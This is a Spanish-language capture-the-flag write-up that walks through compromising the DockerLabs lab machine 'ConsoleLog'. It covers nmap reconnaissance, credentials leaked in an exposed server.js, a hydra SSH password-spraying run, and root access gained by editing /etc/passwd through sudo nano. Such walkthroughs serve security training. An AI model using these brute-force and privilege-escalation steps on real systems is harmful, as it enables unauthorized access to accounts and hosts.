#MAQUINA #DOCKERLABS #FACIL
<hr>

# RECONOCIMIENTO

Vamos a resolver **ConsoleLog** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 10:43 CET
Initiating ARP Ping Scan at 10:43
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:43, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:43
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Discovered open port 3000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:43, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-11-26 10:43:04 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y los puertos **3000 y 5000** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 10:44 CET
Nmap scan report for 172.17.0.2
Host is up (0.000022s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Mi Sitio
|_http-server-header: Apache/2.4.61 (Debian)
3000/tcp open  http    Node.js Express framework
|_http-title: Error
5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 f8:37:10:7e:16:a2:27:b8:3a:6e:2c:16:35:7d:14:fe (ECDSA)
|_  256 cd:11:10:64:60:e8:bf:d9:a4:f4:8e:ae:3b:d8:e1:8d (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.43 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 10:45 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|_  /backend/: Potentially interesting directory w/ listing on 'apache/2.4.61 (debian)'
3000/tcp open  ppp
5000/tcp open  upnp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** En el puerto **3000** corre un servicio **http**, en el puerto **5000** un servicio **ssh**. En el puerto **80** tenemos un directorio llamado **backend**.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos que dentro de **backend** hay un archivo **server.js** que tiene lo siguiente:

   ```bash

const express = require('express');
const app = express();

const port = 3000;

app.use(express.json());

app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});

```

Posible usuario y contraseña -> **tokentraviesito** y **lapassworddebackupmaschingonadetodas**

# EXPLOTACION

Tras probar a acceder con esas credenciales en el puerto 5000 vía ssh, vemos que no es posible.

Usamos **hydra** para intentar sacar un usuario que reutilice posiblemente la contraseña:

   ```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -t 64  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-26 11:17:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://172.17.0.2:5000/
[STATUS] 416.00 tries/min, 416 tries in 00:01h, 8295085 to do in 332:21h, 18 active
[STATUS] 342.00 tries/min, 1026 tries in 00:03h, 8294481 to do in 404:13h, 12 active
[5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas

```
**usuario : lovely**
**contraseña: lapassworddebackupmaschingonadetodas**

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
lovely@37820b32df01:~$ sudo -l
Matching Defaults entries for lovely on 37820b32df01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User lovely may run the following commands on 37820b32df01:
    (ALL) NOPASSWD: /usr/bin/nano

```

Vemos **nano** con permisos SUDO :
   ```bash
Modificar la linea de root en el /etc/passwd para quue al hacer su no pida contra:
root::0:0:root:/root:/bin/bash

lovely@37820b32df01:~$ sudo nano /etc/passwd
lovely@37820b32df01:~$ su
root@37820b32df01:/home/lovely# whoami
root
root@37820b32df01:/home/lovely#

```

**YA ESTAMOS COMO ROOT.**